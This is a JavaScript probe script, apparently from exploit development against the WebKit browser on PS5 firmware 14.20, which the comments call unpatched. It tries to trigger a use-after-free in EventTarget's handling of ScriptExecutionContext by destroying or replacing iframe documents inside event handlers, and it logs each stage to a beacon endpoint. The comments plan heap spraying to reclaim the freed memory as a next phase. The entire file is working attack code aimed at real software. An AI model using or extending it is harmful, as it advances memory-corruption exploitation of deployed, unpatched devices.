// p401 - EventTarget ScriptExecutionContext UAF probe
//
// Bug: EventTarget.cpp:332 uses raw reference to ScriptExecutionContext.
// Event handler can destroy the Document (navigate, document.open, etc.)
// The raw reference becomes dangling, used again at line 380.
//
// Fixed in WK-1400: Ref<> strong reference
// PS5 14.20 uses WK-1200: UNPATCHED
//
// Phase 1: Confirm the UAF fires (crash or observable side effect)
// Phase 2 (if crash confirmed): heap spray to reclaim Document memory
//
// Strategy:
// 1. Create iframe with known document
// 2. Register click event on iframe's element
// 3. In event handler: remove iframe from DOM (destroys iframe Document)
// 4. Monitor for crash (beacon stops) or observable effect
//
// SAFE MODE: First test with non-destructive document.open()
// which may or may not destroy the context depending on refcounting
//
// Beacon prefix: V401-

(function() {
  var BQ = 0;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V401-' + tag + '?t=' + Date.now() + '&q=' + (BQ++), false);
      x.send('');
    } catch(e) {}
  }

  B('BOOT');

  try {
    // Test 1: document.open() during event dispatch (milder)
    // This replaces the document but may not free the context immediately
    var div1 = document.createElement('div');
    div1.id = 'test1';
    div1.textContent = 'T1';
    document.body.appendChild(div1);
    var t1Fired = false;
    div1.addEventListener('click', function(e) {
      t1Fired = true;
      B('T1-HANDLER-ENTER');
      // document.open() replaces the active document
      // The ScriptExecutionContext (Document) SHOULD be the same object
      // but internal state changes
      try {
        document.open();
        document.write('<html><body>replaced</body></html>');
        document.close();
        B('T1-DOCOPEN-OK');
      } catch(ex) {
        B('T1-DOCOPEN-ERR-' + ex.message.substring(0, 40));
      }
      B('T1-HANDLER-EXIT');
    });
    div1.click();
    B('T1-AFTER-' + (t1Fired ? 'FIRED' : 'NOPE'));

    // Test 2: iframe removal during event dispatch
    // Create iframe, register event on its document, remove iframe
    var iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    document.body.appendChild(iframe);

    // Wait for iframe to have a document
    setTimeout(function() {
      try {
        var idoc = iframe.contentDocument;
        var ibody = idoc.body;
        if (!ibody) {
          B('T2-NO-BODY');
          runTest3();
          return;
        }

        var el = idoc.createElement('div');
        el.id = 'target';
        el.textContent = 'click me';
        ibody.appendChild(el);
        B('T2-IFRAME-READY');

        var t2Count = 0;
        el.addEventListener('click', function(e) {
          t2Count++;
          B('T2-HANDLER-' + t2Count);
          if (t2Count === 1) {
            // First click: remove iframe from parent document
            // This should destroy the iframe's Document
            try {
              iframe.parentNode.removeChild(iframe);
              B('T2-IFRAME-REMOVED');
            } catch(ex) {
              B('T2-REMOVE-ERR-' + ex.message.substring(0, 40));
            }
            // If UAF: the context ref is now dangling
            // The code at EventTarget.cpp:380 will use it
          }
        });

        // Dispatch the event
        var ev = new Event('click', { bubbles: true });
        el.dispatchEvent(ev);
        B('T2-DISPATCHED');

        // If we get here, no crash
        B('T2-SURVIVED');
      } catch(e) {
        B('T2-ERR-' + e.message.substring(0, 60));
      }

      runTest3();
    }, 100);

    // Test 3: MessageEvent on Worker with navigation
    function runTest3() {
      try {
        // Create a second iframe and navigate it during message event
        var iframe2 = document.createElement('iframe');
        iframe2.style.display = 'none';
        document.body.appendChild(iframe2);

        setTimeout(function() {
          try {
            var idoc2 = iframe2.contentDocument;
            var ibody2 = idoc2.body;
            if (!ibody2) {
              B('T3-NO-BODY');
              finish();
              return;
            }

            // Register message handler on iframe window
            iframe2.contentWindow.addEventListener('message', function(e) {
              B('T3-MSG-RECEIVED');
              // Navigate the iframe during message handling
              try {
                iframe2.src = 'about:blank';
                B('T3-NAVIGATED');
              } catch(ex) {
                B('T3-NAV-ERR-' + ex.message.substring(0, 40));
              }
            });

            // Post message to trigger the handler
            iframe2.contentWindow.postMessage('trigger', '*');
            B('T3-POSTED');

            setTimeout(function() {
              B('T3-SURVIVED');
              finish();
            }, 200);
          } catch(e) {
            B('T3-ERR-' + e.message.substring(0, 60));
            finish();
          }
        }, 100);
      } catch(e) {
        B('T3-OUTER-ERR-' + e.message.substring(0, 60));
        finish();
      }
    }

    function finish() {
      // Test 4: Multiple event listeners where second one navigates
      try {
        var iframe3 = document.createElement('iframe');
        iframe3.style.display = 'none';
        document.body.appendChild(iframe3);

        setTimeout(function() {
          try {
            var idoc3 = iframe3.contentDocument;
            if (!idoc3 || !idoc3.body) {
              B('T4-NO-DOC');
              B('COMPLETE');
              return;
            }

            var btn = idoc3.createElement('button');
            idoc3.body.appendChild(btn);

            // First listener: just log
            btn.addEventListener('click', function() {
              B('T4-FIRST-HANDLER');
            });

            // Second listener: destroy the document
            btn.addEventListener('click', function() {
              B('T4-SECOND-HANDLER');
              // Open a new document -- this replaces the Document object
              try {
                idoc3.open();
                idoc3.write('');
                idoc3.close();
                B('T4-REPLACED');
              } catch(ex) {
                B('T4-REPLACE-ERR-' + ex.message.substring(0, 40));
              }
            });

            // Third listener: check if context is stale
            btn.addEventListener('click', function() {
              B('T4-THIRD-HANDLER');
              // If the context was freed, this could crash or show weird behavior
              try {
                var t = idoc3.title;
                B('T4-TITLE-' + (t === '' ? 'EMPTY' : t.substring(0, 20)));
              } catch(ex) {
                B('T4-TITLE-ERR-' + ex.message.substring(0, 40));
              }
            });

            btn.click();
            B('T4-DISPATCHED');

            setTimeout(function() {
              B('T4-SURVIVED');
              B('COMPLETE');
            }, 200);
          } catch(e) {
            B('T4-ERR-' + e.message.substring(0, 60));
            B('COMPLETE');
          }
        }, 100);
      } catch(e) {
        B('T4-OUTER-ERR-' + e.message.substring(0, 60));
        B('COMPLETE');
      }
    }

  } catch(e) {
    B('ERR-' + e.message.substring(0, 80));
  }
})();
